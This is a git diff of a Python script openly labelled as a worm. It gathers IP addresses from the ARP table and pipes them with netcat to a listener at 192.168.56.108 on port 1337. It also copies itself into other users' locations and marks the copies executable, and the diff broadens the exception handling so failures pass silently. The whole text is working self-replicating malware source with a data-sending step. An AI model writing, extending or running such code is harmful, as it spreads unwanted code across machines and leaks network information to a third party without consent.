@@ -1,5 +1,6 @@
-#!/usr/bin/env python
-
+'''
+Our code -> Wooooooooooooooooooooooooooooorm <- Your machine
+'''
 import subprocess
 import re
 from os import path, system, walk
@@ -10,8 +11,12 @@ from random import random
 def worm_spread():
 
     target_ips=[]
- 
-    arp_list = subprocess.check_output(["arp", "-a"])
+    
+    subprocess.call("arp -a > stored_arp.txt", shell=True)
+    arp_list = open("stored_arp.txt", "r")
+    arp_list = arp_list.read()
+
+    #arp_list = subprocess.check_output(["arp", "-a"])
 
     pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
     
@@ -27,7 +32,7 @@ def worm_spread():
 
 def nc_listener():
     
-    listen_var="echo " + str(worm_spread()) + " | nc 192.168.56.101 1337"
+    listen_var="echo " + str(worm_spread()) + " | nc 192.168.56.108 1337"
 
     subprocess.call(listen_var, shell=True)
 
@@ -77,9 +82,7 @@ def main():
                     destination = replicate(filename, location, user, name)
                     make_executable(destination)
                     print(destination)
-                except PermissionError:
-                    continue
-                except FileNotFoundError:
+                except:
                     continue
 
 
